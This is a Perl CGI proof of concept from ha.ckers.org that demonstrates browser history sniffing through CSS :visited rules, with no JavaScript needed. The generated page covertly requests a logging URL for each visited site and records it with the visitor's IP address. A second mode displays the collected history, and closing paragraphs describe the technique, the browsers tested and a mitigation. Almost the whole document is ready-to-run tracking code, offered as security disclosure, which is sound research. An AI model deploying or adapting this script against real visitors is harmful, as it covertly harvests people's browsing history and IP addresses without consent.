#!/usr/bin/perl
#By Robert Hansen (RSnake) for http://ha.ckers.org/

#### chmod this world write-able by your web user (EG: chmod 666 log.txt) ####
$file_to_log_to = "log.txt";

#### Change these (the rest of the script builds itself for you) ####
@sites = (
          "http://www.yahoo.com/",
          "http://www.google.com/", 
          "http://www.myspace.com/",
          "http://www.msn.com/",
          "http://www.ebay.com/",
          "http://ha.ckers.org/"
         );

#Use a psuedo-unique string instead of cookies
$string = 100000000000 - int(rand(10000000000));
$string = "$ENV{REMOTE_ADDR}.$string";

if ($ENV{QUERY_STRING}) {
  print "Content-type: text/plain\n\n";
  if ($ENV{QUERY_STRING} =~ m/([\d\.]*)-(\d*)/) {
    open (FILE, ">>$file_to_log_to") or die ("Cannot open $!");
    print FILE "$1 - $sites[$2]\n";
  } else {
    open (FILE, "$file_to_log_to") or die ("Cannot open $!");
    print "The following sites were visited:\n";
    foreach $line (<FILE>) {
      if ($line =~ m/$ENV{QUERY_STRING} - (.*)/) {
        print "\tVisited: $1\n" unless ($urls{$1});
        $urls{$1} = 1;
      }
    }
  }
  close FILE;
} else {
  print "Content-type: text/html\n\n";
  print<<EOHEADER;
<html>
  <head>
    <title>CSS History Hack Without JavaScript</title>
  <head>
  <body>
    <style>
      #menu {
        width:15em; 
        padding:0.5em; 
        background:#ccc;
        margin:0 auto;
      }
      #menu a, #menu a:visited {
        display:block; 
        width:14em; 
        padding:0.25em 0;
        color:#000; 
        text-indent:0.2em;
        background-color:#fff; 
        text-decoration:none;
        margin:0.5em 0; 
        border-left:0.5em solid #9ab; 
      }
EOHEADER
  for ($i = 0; $i <= $#sites; $i++) {
    print<<EOCSS;
      #menu a:visited span.span$i {
        display:block; 
        background: url(CSS-history.cgi?$string-$i);
        position:absolute; 
        top:0; 
        left:18em; 
        width:5em;
        font-size:0.9em;
        color:#c00; 
        border:1px solid #c00;
      }
EOCSS
  }
  print<<EOHTML;
      #menu a span {
        display:none;
      }
      #menu a:hover {
        color:#f00; 
        border-left:0.5em solid #000; 
      }
      .box {
        position:relative;
      }
      p.text {
        padding-left: 50px;
        padding-right: 50px;
      }
    </style>
    <div align="center">
      <h2>CSS History Hack Without JavaScript</h2><BR>
      <div id="menu" align="left">
EOHTML

  for ($i = 0; $i <= $#sites; $i++) {
    print<<EOURL;
        <div class="box">
          <a href="$sites[$i]">
            $sites[$i]
            <span class="span$i">VISITED</span>
          </a>
        </div>
EOURL
  }
  print<<FOOTER;
      </div>
      <p>Now <a href="CSS-history.cgi?$string">click here</A> to see that your information has been logged.</p>
    </div>
    <p class="text">This is an example of how <A HREF="http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html">the original CSS history hack found by Jeremiah Grossman</A> can be modified to work without a single line of JavaScript.  It uses the fact that properties within <i><b>display:</b></i> when combined with <i><b>a:visited</b></i> creates conditional logic.  That condition will not fire certain things within the block.  In this case I am including a nonexitant background image <i><b>background: url(...);</b></i> set in the CSS itself that is seemless to the user.  The image actually points to a CGI script with the information about the URL that has been visited and is then logged along with the IP address of the user for later retrieval.</p>
    <p class="text">This should be mitigated by the <A HREF="http://www.safehistory.com/">SafeHistory plugin in Firefox</A> but turning off JavaScript has no effect on the technique in the browsers tested (Internet Explorer 7.0 and Firefox 2.0.0.2).  This did not work in Opera 9.02 when tested.  Note: I chose this list because it is the Alexa top 5 in the United States. I also added one that's on the same site as this demo so it should not be blocked by cross domain restrictions imposed by SafeHistory.</p>
    <p class="text">- By <A HREF="http://ha.ckers.org/">RSnake</A></p>   
  </body> 
</html>
FOOTER
}
